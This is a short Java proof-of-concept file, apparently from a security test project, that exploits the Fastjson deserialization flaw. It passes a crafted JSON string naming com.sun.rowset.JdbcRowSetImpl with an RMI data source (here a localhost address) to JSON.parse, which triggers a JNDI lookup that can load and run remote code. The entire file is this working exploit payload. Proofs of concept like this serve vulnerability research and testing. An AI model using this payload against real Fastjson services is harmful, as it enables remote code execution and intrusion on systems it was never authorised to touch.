package com.test.example2;

import com.alibaba.fastjson.JSON;

/**
 *  Use JDK 7u21
 */
public class Poc1 {
    public static void main(String[] argv) throws Exception {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\", " +
                "\"autoCommit\":true}";
        JSON.parse(payload);
    }
}
